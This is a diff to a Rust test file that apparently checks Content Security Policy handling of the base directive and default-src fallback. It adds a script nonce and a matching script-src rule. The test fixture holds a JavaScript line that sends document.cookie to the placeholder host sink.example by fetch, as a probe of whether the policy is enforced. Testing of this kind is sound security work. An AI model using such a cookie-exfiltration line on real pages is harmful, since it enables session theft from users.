@@ -233,7 +233,7 @@ fn meta_inert_document_isolation() {
 fn component(headers: &[(&str, &str)], policy: Option<&str>) -> Arc<App> {
     let body_type = "(list u8)";
     let script = "const b=document.createElement('base');b.href='/nested/';document.head.append(b);console.log(new URL(document.baseURI).pathname);if(new URL(document.baseURI).pathname==='/')fetch('https://sink.example/?v='+encodeURIComponent(document.cookie))";
-    let html = format!("<!doctype html><body><script>{script}</script>");
+    let html = format!("<!doctype html><body><script nonce=base-review>{script}</script>");
     let encoded: String = html.as_bytes().iter().map(|byte| format!("\\{byte:02x}")).collect();
     let mut records = vec![];
     let mut text = vec![];
@@ -331,5 +331,5 @@ fn repeated_response_policies_intersect() {
 }
 #[test]
 fn an_absent_base_directive_has_no_default_src_fallback() {
-    connected(&[], Some("default-src 'none'"), "/nested/");
+    connected(&[], Some("default-src 'none';script-src 'nonce-base-review'"), "/nested/");
 }
